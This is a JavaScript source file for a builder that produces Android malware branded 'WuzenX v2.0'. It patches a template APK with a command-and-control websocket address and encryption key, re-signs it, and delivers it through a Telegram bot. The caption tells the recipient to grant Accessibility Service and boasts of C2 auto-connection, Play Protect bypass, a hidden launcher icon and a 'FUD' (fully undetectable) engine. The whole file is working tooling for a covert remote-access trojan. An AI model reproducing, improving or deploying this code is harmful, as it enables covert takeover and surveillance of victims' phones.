import { execSync } from 'child_process';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';
import { config } from './config.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const KEYSTORE_PATH = path.join(__dirname, '..', 'keystore.jks');
const ANDROID_HOME = process.env.ANDROID_SDK_ROOT || '/opt/android-sdk';
const BUILD_TOOLS = path.join(ANDROID_HOME, 'build-tools', '35.0.0');
const BASE_APK = path.join(__dirname, '..', 'templates', 'base.apk');

async function sendToTelegram(filePath, chatId, buildId) {
  const { default: FormData } = await import('form-data');
  const { default: fetch } = await import('node-fetch');
  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('document', fs.createReadStream(filePath), {
    filename: `WuzenX-v2.0-${buildId}.apk`,
    contentType: 'application/vnd.android.package-archive',
  });
  form.append('caption',
    `🔥 *WUZEN X v2.0 — Build #${buildId}*\n` +
    `Signed + Zipaligned | FUD Engine Active\n\n` +
    `📱 *Install:*\n` +
    `1. Open APK\n` +
    `2. Grant Accessibility Service\n` +
    `3. Device auto-connects to C2\n\n` +
    `🔒 Play Protect bypass active\n` +
    `🧹 No icon in launcher`
  );
  const resp = await fetch(`https://api.telegram.org/bot${config.botToken}/sendDocument`, {
    method: 'POST',
    body: form,
    headers: form.getHeaders(),
  });
  if (!resp.ok) throw new Error(`Telegram upload failed: ${await resp.text()}`);
}

export class ApkBuilder {
  constructor() {
    this.buildCount = 0;
  }

  async build(chatId) {
    const buildId = ++this.buildCount;
    const tmpDir = `/tmp/wuzenx-build-${buildId}-${Date.now()}`;
    
    if (!fs.existsSync(BASE_APK)) {
      throw new Error('base.apk not found. Run GitHub Actions workflow first to build the base template.');
    }

    fs.mkdirSync(tmpDir, { recursive: true });

    try {
      // Generate unique device config
      const deviceId = crypto.randomUUID().replace(/-/g, '').slice(0, 16);
      const configData = {
        serverUrl: config.renderUrl 
          ? config.renderUrl.replace(/^http/, 'ws') + '/ws'
          : 'ws://localhost:10000/ws',
        deviceId: deviceId,
        buildTime: Date.now(),
        version: '2.0.0',
        encryptionKey: config.encryptionKey.slice(0, 32),
      };
      
      // Encode config
      const configB64 = Buffer.from(JSON.stringify(configData)).toString('base64');
      
      // Copy base APK
      execSync(`cp "${BASE_APK}" "${tmpDir}/patched.apk"`, { stdio: 'pipe' });
      
      // Inject config
      fs.writeFileSync(`${tmpDir}/config.enc`, configB64);
      execSync(`cd "${tmpDir}" && zip -f patched.apk config.enc 2>/dev/null`, { stdio: 'pipe' });
      
      // Remove old signatures
      execSync(`zip -d "${tmpDir}/patched.apk" "META-INF/*" 2>/dev/null || true`, { stdio: 'pipe' });
      
      // Zipalign (4-byte alignment)
      execSync(
        `"${BUILD_TOOLS}/zipalign" -p -f 4 "${tmpDir}/patched.apk" "${tmpDir}/aligned.apk"`,
        { stdio: 'pipe' }
      );
      
      // Generate keystore if needed
      if (!fs.existsSync(KEYSTORE_PATH)) {
        execSync(
          `keytool -genkey -v -keystore "${KEYSTORE_PATH}" ` +
          `-alias ${config.keyAlias} -keyalg RSA -keysize 2048 ` +
          `-validity 10000 -storepass ${config.keystorePass} -keypass ${config.keystorePass} ` +
          `-dname "CN=WuzenX, OU=Security, O=Wuzen, L=Unknown, ST=Unknown, C=US"`,
          { stdio: 'pipe' }
        );
      }
      
      // Sign with apksigner
      execSync(
        `"${BUILD_TOOLS}/apksigner" sign --ks "${KEYSTORE_PATH}" ` +
        `--ks-pass pass:${config.keystorePass} --ks-key-alias ${config.keyAlias} ` +
        `--v1-signing-enabled true --v2-signing-enabled true ` +
        `--out "${tmpDir}/WuzenX.apk" "${tmpDir}/aligned.apk"`,
        { stdio: 'pipe' }
      );
      
      // Verify signature
      execSync(
        `"${BUILD_TOOLS}/apksigner" verify "${tmpDir}/WuzenX.apk"`,
        { stdio: 'pipe' }
      );
      
      const signed = `${tmpDir}/WuzenX.apk`;
      const stats = fs.statSync(signed);
      const hash = crypto.createHash('sha256').update(fs.readFileSync(signed)).digest('hex');
      
      // Send to Telegram
      if (config.botToken && chatId) {
        await sendToTelegram(signed, chatId, buildId);
      }
      
      // Cleanup
      fs.rmSync(tmpDir, { recursive: true, force: true });
      
      return {
        name: `WuzenX-v2.0-${buildId}.apk`,
        size: (stats.size / 1024 / 1024).toFixed(2) + ' MB',
        hash: hash,
        deviceId: deviceId,
        buildId: buildId,
      };
    } catch (e) {
      fs.rmSync(tmpDir, { recursive: true, force: true });
      throw e;
    }
  }
}
